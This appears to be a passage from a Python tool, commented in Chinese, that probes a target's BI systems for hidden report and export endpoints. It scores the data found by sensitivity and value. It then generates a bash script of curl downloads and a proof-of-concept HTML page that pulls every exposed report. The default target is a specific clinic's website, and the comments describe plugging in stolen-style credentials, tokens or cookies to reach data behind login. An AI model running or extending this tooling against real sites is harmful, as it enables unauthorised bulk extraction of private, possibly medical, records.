            url = report.get('url', report.get('endpoint', ''))
            if url:
                payloads.append({
                    "url": url,
                    "method": report.get('method', 'GET'),
                    "sensitive_level": report.get('sensitive_level', 'low'),
                    "value_score": report.get('analysis', {}).get('data_value_score', 0)
                })
        
        burp_config['discovered_endpoints'] = payloads
        
        with open(config_file, 'w', encoding='utf-8') as f:
            json.dump(burp_config, f, indent=2, ensure_ascii=False)
            
        print(f" Burp配置: {config_file}")

    def _print_smart_summary(self, report, analysis):
        """打印智能摘要"""
        print(f"\n" + "="*80)
        print(f" 智能化隐藏报表发现完成!")
        print(f"="*80)
        
        # 基础统计
        print(f" 扫描统计:")
        print(f"   • 目标系统: {self.target_url}")
        print(f"   • BI系统: {len(self.bi_systems)} 个")
        print(f"   • 报表端点: {len(self.export_endpoints)} 个")
        print(f"   • 成功获取: {len(self.found_reports)} 个报表")
        print(f"   • 测试路径: {self.noise_stats['total_paths_tested']} 个")
        
        # 噪音过滤效果
        if NOISE_FILTER_AVAILABLE:
            noise_ratio = self.noise_stats['noise_filtered'] / max(1, self.noise_stats['total_paths_tested'])
            print(f"\n 噪音过滤效果:")
            print(f"   • 过滤噪音: {self.noise_stats['noise_filtered']} 个")
            print(f"   • 有价值发现: {self.noise_stats['valuable_findings']} 个") 
            print(f"   • 过滤率: {noise_ratio:.1%}")
            if noise_ratio > 0.5:
                print(f"    成功避免了严重的'傻逼兴奋' - 大量噪音被过滤!")
        
        # 风险评估
        print(f"\n🚨 风险评估:")
        print(f"   • 整体风险: {analysis['security_risks']['overall_risk'].upper()}")
        print(f"   • 数据暴露: {analysis['data_exposure']['severity'].upper()}")
        print(f"   • 暴露记录: {analysis['data_exposure']['total_records_exposed']:,} 条")
        print(f"   • 敏感类型: {len(analysis['data_exposure']['sensitive_data_types'])} 种")
        
        # 高价值发现
        high_value = [r for r in self.found_reports if r.get('analysis', {}).get('data_value_score', 0) > 80]
        if high_value:
            print(f"\n 高价值发现:")
            for i, report in enumerate(high_value[:5], 1):
                url = report.get('url', report.get('endpoint', ''))[:50]
                score = report.get('analysis', {}).get('data_value_score', 0)
                level = report.get('sensitive_level', 'unknown')
                print(f"   {i}. {url}... (评分: {score}, 级别: {level})")
        
        # 关键问题
        if analysis['security_risks']['critical_issues']:
            print(f"\n🚨 关键问题:")
            for issue in analysis['security_risks']['critical_issues']:
                print(f"   • {issue}")
        
        # 推荐行动
        print(f"\n️ 推荐行动:")
        for i, rec in enumerate(analysis['recommendations'][:5], 1):
            print(f"   {i}. {rec}")
        
        print(f"\n" + "="*80)

    def generate_report(self):
        """生成报告"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        report = {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'bi_systems': self.bi_systems,
            'found_reports': len(self.found_reports),
            'export_endpoints': len(self.export_endpoints),
            'reports': self.found_reports,
            'extracted_data': self.extracted_data
        }
        
        # 保存JSON报告
        report_file = f"hidden_report_finder_{timestamp}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
            
        # 生成利用脚本
        if self.found_reports:
            script_file = f"report_downloader_{timestamp}.sh"
            with open(script_file, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write(f"# 报表下载脚本\n")
                f.write(f"# 目标: {self.target_url}\n")
                f.write(f"# 时间: {datetime.now()}\n\n")
                
                f.write("# 创建下载目录\n")
                f.write("mkdir -p reports_download\n\n")
                
                # 下载命令
                for i, report in enumerate(self.found_reports):
                    url = report.get('url', report['endpoint'])
                    
                    # 根据类型确定文件扩展名
                    content_type = report.get('content_type', '')
                    if 'json' in content_type:
                        ext = '.json'
                    elif 'csv' in content_type:
                        ext = '.csv'
                    elif 'excel' in content_type or 'spreadsheet' in content_type:
                        ext = '.xlsx'
                    elif 'xml' in content_type:
                        ext = '.xml'
                    else:
                        ext = ''
                        
                    f.write(f"# 报表 {i+1}\n")
                    f.write(f"echo '下载报表 {i+1}...'\n")
                    f.write(f"curl -o 'reports_download/report_{i+1}{ext}' '{url}'\n\n")
                    
                f.write("echo '下载完成!'\n")
                f.write("ls -la reports_download/\n")
                
            import os
            os.chmod(script_file, 0o755)
            
        # 生成POC HTML
        if self.found_reports:
            poc_file = f"report_poc_{timestamp}.html"
            with open(poc_file, 'w') as f:
                f.write("""<!DOCTYPE html>
<html>
<head>
    <title>报表POC</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial; margin: 20px; }
        .report { margin: 20px 0; padding: 10px; border: 1px solid #ccc; }
        button { margin: 5px; padding: 10px; }
    </style>
</head>
<body>
    <h1>隐藏报表功能POC</h1>
    <p>目标: """ + self.target_url + """</p>
    
    <h2>发现的报表:</h2>
""")
                
                for i, report in enumerate(self.found_reports):
                    url = report.get('url', report['endpoint'])
                    f.write(f"""
    <div class="report">
        <h3>报表 {i+1}</h3>
        <p>URL: {url}</p>
        <p>类型: {report.get('content_type', 'unknown')}</p>
        <p>大小: {self.format_size(report.get('size', 0))}</p>
        <button onclick="window.open('{url}')">在新窗口打开</button>
        <button onclick="downloadReport('{url}', 'report_{i+1}')">下载</button>
    </div>
""")
                    
                f.write("""
    <script>
    function downloadReport(url, filename) {
        fetch(url)
            .then(resp => resp.blob())
            .then(blob => {
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = filename;
                a.click();
            });
    }
    </script>
</body>
</html>""")
                
            print(f"[+] POC页面: {poc_file}")
            
        print(f"\n[+] 隐藏报表发现完成!")
        print(f"[+] BI系统: {len(self.bi_systems)}")
        print(f"[+] 报表端点: {len(self.export_endpoints)}")
        print(f"[+] 可用报表: {len(self.found_reports)}")
        print(f"[+] 报告文件: {report_file}")
        
        if self.found_reports:
            print(f"[+] 下载脚本: {script_file}")
            
            # 打印最有价值的发现
            print("\n[!] 最有价值的发现:")
            
            # 按大小排序
            sorted_reports = sorted(self.found_reports, key=lambda x: x.get('size', 0), reverse=True)
            
            for report in sorted_reports[:5]:
                print(f"    {report.get('endpoint', report.get('url'))}")
                print(f"      大小: {self.format_size(report.get('size', 0))}")
                
                if 'analysis' in report:
                    analysis = report['analysis']
                    print(f"      记录数: {analysis.get('record_count', 'unknown')}")
                    if 'sensitive_fields' in analysis:
                        print(f"      敏感字段: {', '.join(analysis['sensitive_fields'])}")

async def main():
    import sys
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("目标URL [https://asanoha-clinic.com]: ").strip()
        if not target:
            target = "https://asanoha-clinic.com"
    
    # 认证配置示例（可根据需要修改）
    auth_config = None
    
    # 示例1: 用户名密码登录
    # auth_config = {
    #     'login_url': f'{target}/login',
    #     'username': 'admin',
    #     'password': 'password123',
    #     'heartbeat_endpoint': '/api/profile'
    # }
    
    # 示例2: 直接使用JWT token
    # auth_config = {
    #     'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
    # }
    
    # 示例3: 使用现有Cookies
    # auth_config = {
    #     'cookies': {
    #         'session_id': 'abc123def456',
    #         'csrf_token': 'xyz789'
    #     }
    # }
    
    print(f"目标 启动隐藏报表发现器")
    print(f"目标 目标: {target}")
    print(f"认证 认证模式: {'启用' if auth_config else '禁用'}")
    
    if auth_config:
        print("  启用认证模式 - 可访问认证后报表金矿！")
    else:
        print("  无认证模式 - 仅访问公开报表")
        print("   提示: 修改main函数中的auth_config来启用认证")
    
    finder = HiddenReportFinder(target, auth_config=auth_config)
    results = await finder.run()
    
    print(f"\n  扫描完成！")
    print(f"  发现报表: {len(results)}")
    
    if auth_config and finder.auth_manager:
        auth_stats = finder.auth_manager.get_auth_stats()
        print(f"认证 认证请求: {auth_stats.get('authenticated_requests', 0)}")
        print(f"认证 认证失败: {auth_stats.get('auth_failures', 0)}")
        print(f"认证 会话恢复: {auth_stats.get('session_recoveries', 0)}")
    
    return results

if __name__ == "__main__":
    asyncio.run(main())